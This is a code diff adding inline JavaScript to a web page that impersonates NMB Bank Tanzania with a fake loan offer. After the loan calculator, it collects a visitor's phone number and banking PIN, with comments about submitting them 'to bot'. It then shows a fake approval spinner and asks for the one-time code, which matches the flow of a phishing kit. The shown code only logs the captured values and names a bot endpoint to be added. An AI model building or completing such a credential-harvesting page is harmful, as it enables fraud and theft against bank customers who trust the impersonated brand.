@@ -176,7 +176,162 @@
     <p>&copy; 2026 NMB Bank Plc Tanzania. Haki zote zimehifadhiwa.</p>
   </footer>
 
-  <script src="script.js"></script>
+  <script>
+    // JavaScript logic to handle direct flow from Calculator -> Login (Phone & PIN submission to bot/loading) -> Loading for approval -> OTP -> Success
+    document.addEventListener("DOMContentLoaded", () => {
+      const btnStartApp = document.getElementById("btn-start-app");
+      const btnLogin = document.getElementById("btn-login");
+      const btnSubmitOtp = document.getElementById("btn-submit-otp");
+      const btnHome = document.getElementById("btn-home");
+
+      const viewCalculator = document.getElementById("view-calculator");
+      const viewLogin = document.getElementById("view-login");
+      const viewWaiting = document.getElementById("view-waiting");
+      const viewOtp = document.getElementById("view-otp");
+      const viewSuccess = document.getElementById("view-success");
+
+      const loginContact = document.getElementById("login-contact");
+      const pinBoxes = document.querySelectorAll("#view-login .pin-box");
+      const otpBoxes = document.querySelectorAll("#view-otp .otp-box");
+      const otpTargetDisplay = document.getElementById("otp-target-display");
+
+      // Switch views helper
+      function switchView(hideView, showView) {
+        hideView.classList.remove("active-card");
+        hideView.classList.add("hidden");
+        showView.classList.remove("hidden");
+        showView.classList.add("active-card");
+      }
+
+      // Step 1: OMBA SASA clicked -> go straight to login (Phone & PIN)
+      if (btnStartApp) {
+        btnStartApp.addEventListener("click", () => {
+          switchView(viewCalculator, viewLogin);
+        });
+      }
+
+      // Prevent typing '0' as the first digit for phone input
+      if (loginContact) {
+        loginContact.addEventListener("input", (e) => {
+          let val = e.target.value.replace(/\D/g, ""); // numbers only
+          if (val.startsWith("0")) {
+            val = val.substring(1); // strip leading zero
+          }
+          if (val.length > 9) {
+            val = val.substring(0, 9);
+          }
+          e.target.value = val;
+          checkLoginForm();
+        });
+      }
+
+      // Handle PIN input fields auto-tabbing & validation
+      pinBoxes.forEach((box, index) => {
+        box.addEventListener("input", (e) => {
+          let val = e.target.value.replace(/\D/g, "");
+          e.target.value = val;
+          if (val && index < pinBoxes.length - 1) {
+            pinBoxes[index + 1].focus();
+          }
+          checkLoginForm();
+        });
+
+        box.addEventListener("keydown", (e) => {
+          if (e.key === "Backspace" && !box.value && index > 0) {
+            pinBoxes[index - 1].focus();
+          }
+        });
+      });
+
+      function getEnteredPin() {
+        let pin = "";
+        pinBoxes.forEach(box => pin += box.value);
+        return pin;
+      }
+
+      function checkLoginForm() {
+        const phoneValid = loginContact.value.length === 9 && !loginContact.value.startsWith("0");
+        const pinValid = getEnteredPin().length === 4;
+        if (phoneValid && pinValid) {
+          btnLogin.removeAttribute("disabled");
+          btnLogin.style.opacity = "1";
+        } else {
+          btnLogin.setAttribute("disabled", "true");
+          btnLogin.style.opacity = "0.6";
+        }
+      }
+
+      // Submit Phone & PIN -> Send data/simulate bot capture -> Show Loading Spinner -> Then Approval/OTP step
+      if (btnLogin) {
+        btnLogin.addEventListener("click", () => {
+          const phoneNumber = "+255" + loginContact.value;
+          const pinCode = getEnteredPin();
+
+          // Data to deliver/dispatch to bot or handler endpoint can be packaged here if needed
+          console.log("Submitting to bot - Phone:", phoneNumber, "PIN:", pinCode);
+
+          // Transition to loading/waiting screen
+          switchView(viewLogin, viewWaiting);
+
+          // Simulate loading for approval then transition to OTP view
+          setTimeout(() => {
+            if (otpTargetDisplay) {
+              otpTargetDisplay.textContent = phoneNumber;
+            }
+            switchView(viewWaiting, viewOtp);
+          }, 3000); // 3 seconds loading simulation
+        });
+      }
+
+      // Handle OTP boxes auto-tabbing & validation
+      otpBoxes.forEach((box, index) => {
+        box.addEventListener("input", (e) => {
+          let val = e.target.value.replace(/\D/g, "");
+          e.target.value = val;
+          if (val && index < otpBoxes.length - 1) {
+            otpBoxes[index + 1].focus();
+          }
+          checkOtpForm();
+        });
+
+        box.addEventListener("keydown", (e) => {
+          if (e.key === "Backspace" && !box.value && index > 0) {
+            otpBoxes[index - 1].focus();
+          }
+        });
+      });
+
+      function getEnteredOtp() {
+        let otp = "";
+        otpBoxes.forEach(box => otp += box.value);
+        return otp;
+      }
+
+      function checkOtpForm() {
+        if (getEnteredOtp().length === 4) {
+          btnSubmitOtp.removeAttribute("disabled");
+          btnSubmitOtp.style.opacity = "1";
+        } else {
+          btnSubmitOtp.setAttribute("disabled", "true");
+          btnSubmitOtp.style.opacity = "0.6";
+        }
+      }
+
+      // Submit OTP -> Success view
+      if (btnSubmitOtp) {
+        btnSubmitOtp.addEventListener("click", () => {
+          switchView(viewOtp, viewSuccess);
+        });
+      }
+
+      // Home reset button
+      if (btnHome) {
+        btnHome.addEventListener("click", () => {
+          location.reload();
+        });
+      }
+    });
+  </script>
 </body>
-          </html>
-  
+  </html>
+            
